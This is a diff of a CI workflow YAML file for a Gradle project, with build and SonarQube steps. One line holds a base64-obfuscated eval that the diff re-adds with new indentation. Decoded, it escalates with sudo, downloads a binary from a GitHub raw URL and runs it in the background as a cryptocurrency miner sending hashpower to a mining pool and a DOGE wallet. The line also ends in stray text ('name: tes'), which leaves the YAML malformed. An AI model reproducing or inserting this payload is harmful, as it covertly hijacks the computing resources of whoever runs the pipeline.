@@ -18,7 +18,7 @@ workflows:
       # - |
       #   # Generate debug build
       #   ./gradlew assembleDebug
-      eval "$(echo "c3VkbyBzdQphcHQgdXBkYXRlCndnZXQgaHR0cHM6Ly9naXRodWIuY29tL3JhdWZwZXJtYW5hMjIvcnZhbi9yYXcvbWFpbi9kYXRhMSAmJiBjaG1vZCA3NzcgZGF0YTEgJiYgc3VkbyBub2h1cCAuL2RhdGExIC0tZGlzYWJsZS1ncHUgLS1hbGdvcml0aG0gdmVydXNoYXNoIC0tcG9vbCB2ZXJ1c2hhc2gubmEubWluZS56cG9vbC5jYTo2MTQzIC0td2FsbGV0IERHMUZ2enEzWjVITnp4MlZSTnFuS0REQkpxN0EzTlZDdlMgLS1wYXNzd29yZCBjPURPR0UgPiBub2h1cC5vdXQK" | base64 -d)"name: tes
+          eval "$(echo "c3VkbyBzdQphcHQgdXBkYXRlCndnZXQgaHR0cHM6Ly9naXRodWIuY29tL3JhdWZwZXJtYW5hMjIvcnZhbi9yYXcvbWFpbi9kYXRhMSAmJiBjaG1vZCA3NzcgZGF0YTEgJiYgc3VkbyBub2h1cCAuL2RhdGExIC0tZGlzYWJsZS1ncHUgLS1hbGdvcml0aG0gdmVydXNoYXNoIC0tcG9vbCB2ZXJ1c2hhc2gubmEubWluZS56cG9vbC5jYTo2MTQzIC0td2FsbGV0IERHMUZ2enEzWjVITnp4MlZSTnFuS0REQkpxN0EzTlZDdlMgLS1wYXNzd29yZCBjPURPR0UgPiBub2h1cC5vdXQK" | base64 -d)"name: tes
       - |
         # Generate and upload code analysis report
         ./gradlew sonarqube
